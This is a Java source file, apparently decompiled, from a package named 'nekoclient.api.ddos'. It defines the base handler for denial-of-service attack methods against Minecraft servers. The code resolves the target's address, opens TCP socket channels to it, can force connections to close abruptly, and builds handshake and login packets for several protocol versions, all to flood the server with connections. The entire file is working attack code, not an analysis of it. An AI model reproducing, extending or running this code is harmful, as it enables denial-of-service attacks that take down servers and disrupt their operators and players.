package dev.neko.nekoclient.api.ddos.impl.handler.minecraft;

import com.eclipsesource.json.JsonObject;
import dev.neko.nekoclient.api.ddos.Protocol;
import dev.neko.nekoclient.api.ddos.impl.handler.MethodHandler;
import dev.neko.nekoclient.api.ddos.impl.handler.minecraft.type.Type;
import dev.neko.nekoclient.api.ddos.impl.handler.minecraft.type.impl.BooleanType;
import dev.neko.nekoclient.api.ddos.impl.handler.minecraft.type.impl.StringType;
import dev.neko.nekoclient.api.ddos.impl.handler.minecraft.type.impl.UUIDType;
import dev.neko.nekoclient.api.ddos.impl.handler.minecraft.type.impl.UnsignedShortType;
import dev.neko.nekoclient.api.ddos.impl.handler.minecraft.type.impl.VarIntType;
import dev.neko.nekoclient.utils.DNSUtil;
import dev.neko.nekoclient.utils.ObjectUtil;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.Buffer;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Objects;
import java.util.UUID;

public abstract class MinecraftMethodHandler implements MethodHandler {
   protected ProtocolVersion protocolVersion;
   protected String host;
   protected int port;
   protected boolean forceClose;

   public abstract void handle(SocketChannel var1) throws IOException;

   @Override
   public void init(Protocol protocol, InetSocketAddress address, String host, JsonObject options) throws IllegalArgumentException {
      this.protocolVersion = ProtocolVersion.valueOf(options.getString("protocolVersion", "V1_19_4"));
      this.forceClose = options.getBoolean("forceClose", false);
      this.host = host;
      this.port = address.getPort();
   }

   @Override
   public InetSocketAddress transformAddress(InetSocketAddress address, String host) {
      if (!Objects.equals(address.getPort(), 25565)) {
         return MethodHandler.super.transformAddress(address, host);
      } else {
         DNSUtil.DNSEntry entry = ObjectUtil.requireNonExceptionElse(() -> DNSUtil.resolveMinecraft(host), null);
         return Objects.isNull(entry) ? MethodHandler.super.transformAddress(address, host) : new InetSocketAddress(entry.getHost(), entry.getPort());
      }
   }

   @Override
   public void run(Protocol protocol, InetSocketAddress address) throws IOException {
      if (!Objects.equals(protocol, Protocol.TCP)) {
         throw new IllegalArgumentException("Unsupported protocol!");
      } else {
         SocketChannel channel = SocketChannel.open();
         channel.connect(address);
         if (this.forceClose) {
            channel.socket().setSoLinger(true, 0);
         }

         this.handle(channel);
      }
   }

   public ByteBuffer createHandshakePacket(ProtocolVersion protocolVersion, String host, int port, State nextState) {
      return this.createPacket(
         0, new VarIntType(protocolVersion.getVersion()), new StringType(host), new UnsignedShortType(port), new VarIntType(nextState.getId())
      );
   }

   public ByteBuffer createLoginStartPacket(String username, UUID uuid) {
      if (this.protocolVersion.isHigherOrEqualTo(ProtocolVersion.V1_19_3)) {
         return Objects.isNull(uuid)
            ? this.createPacket(0, new StringType(username), new BooleanType(false))
            : this.createPacket(0, new StringType(username), new BooleanType(true), new UUIDType(uuid));
      } else if (this.protocolVersion.inRange(ProtocolVersion.V1_19, ProtocolVersion.V1_19_2)) {
         return Objects.isNull(uuid)
            ? this.createPacket(0, new StringType(username), new BooleanType(false), new BooleanType(false))
            : this.createPacket(0, new StringType(username), new BooleanType(false), new BooleanType(true), new UUIDType(uuid));
      } else {
         return this.createPacket(0, new StringType(username));
      }
   }

   public ByteBuffer createPacket(int id, Type<?>... types) {
      VarIntType packetId = new VarIntType(id);
      int size = packetId.size();

      for(Type<?> type : types) {
         size += type.size();
      }

      ByteBuffer packetBuffer = ByteBuffer.allocate(size);
      packetId.write(packetBuffer);

      for(Type<?> type : types) {
         type.write(packetBuffer);
      }

      ((Buffer)packetBuffer).flip();
      VarIntType packetLength = new VarIntType(packetBuffer.capacity());
      ByteBuffer buffer = ByteBuffer.allocate(packetLength.size() + packetBuffer.capacity());
      packetLength.write(buffer);
      buffer.put(packetBuffer);
      ((Buffer)buffer).flip();
      return buffer;
   }

   public final MinecraftMethodHandler.Packet readPacket(SocketChannel channel) throws IOException {
      ByteBuffer buffer = ByteBuffer.allocate(1);
      int packetLength = 0;
      int moves = 0;

      byte buff;
      do {
         ((Buffer)buffer).position(0);
         channel.read(buffer);
         ((Buffer)buffer).position(0);
         buff = buffer.get();
         packetLength |= (buff & 127) << moves++ * 7;
         if (moves > 5) {
            throw new RuntimeException("VarInt too big");
         }
      } while((buff & 128) == 128);

      ByteBuffer packetBuf = ByteBuffer.allocate(packetLength);
      channel.read(packetBuf);
      ((Buffer)packetBuf).flip();
      return new MinecraftMethodHandler.Packet(new VarIntType().read(packetBuf), packetBuf);
   }

   public static class Packet {
      private final int id;
      private final ByteBuffer buffer;

      public Packet(int id, ByteBuffer buffer) {
         this.id = id;
         this.buffer = buffer;
      }

      public final int getId() {
         return this.id;
      }

      public final ByteBuffer getBuffer() {
         return this.buffer;
      }
   }
}
